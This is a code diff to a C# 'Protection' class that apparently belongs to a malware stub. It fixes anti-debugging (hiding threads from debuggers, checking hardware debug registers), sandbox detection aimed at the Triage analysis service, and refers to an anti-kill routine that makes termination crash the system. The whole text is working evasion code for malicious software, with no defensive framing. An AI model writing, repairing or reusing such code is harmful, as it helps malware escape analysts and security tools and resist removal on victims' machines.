@@ -19,7 +19,7 @@ internal static partial class Protection
     private static partial int NtQueryInformationProcess(nint hProcess, int processInfoClass, out nint info, int size, out int returnLength);
 
     [LibraryImport("ntdll.dll")]
-    private static partial int NtSetInformationThread(nint hThread, int threadInfoClass, ref int info, int length);
+    private static partial int NtSetInformationThread(nint hThread, int threadInfoClass, nint info, int length);
 
     [LibraryImport("kernel32.dll")]
     private static partial nint GetCurrentThread();
@@ -389,7 +389,7 @@ internal static partial class Protection
         // x64 CONTEXT: size=0x4D0, requires 16-byte alignment
         // ContextFlags @ 0x30, DR0–DR3 @ 0x98/0xA0/0xA8/0xB0, DR7 @ 0xC0
         const int  SIZE  = 0x4D0 + 16;
-        const int  FLAGS = 0x00010010; // CONTEXT_DEBUG_REGISTERS
+        const int  FLAGS = 0x00100010; // CONTEXT_DEBUG_REGISTERS (CONTEXT_AMD64=0x100000 | 0x10)
         var buf = new byte[SIZE];
         fixed (byte* raw = buf)
         {
@@ -491,8 +491,7 @@ internal static partial class Protection
 
     public static void HideFromDebugger()
     {
-        int zero = 0;
-        NtSetInformationThread(GetCurrentThread(), 0x11, ref zero, 0);
+        NtSetInformationThread(GetCurrentThread(), 0x11, nint.Zero, 0);
     }
 
     // â"€â"€ Anti-Kill (Critical Process â†' BSOD on terminate) â"€â"€
@@ -1674,7 +1673,7 @@ internal static partial class Protection
         {
             var mn = Environment.MachineName.ToLowerInvariant();
             // Triage uses short random-looking or pattern-based names
-            if (mn.Length <= 5 || mn.StartsWith("win-") || mn.StartsWith("desktop-") && mn.Length < 16)
+            if (mn.Length <= 5 || (mn.StartsWith("desktop-") && mn.Length < 16))
             {
                 score++;
                 StubLog.Info($"[AntiSandbox] Suspicious machine name pattern: {mn} (+1)");
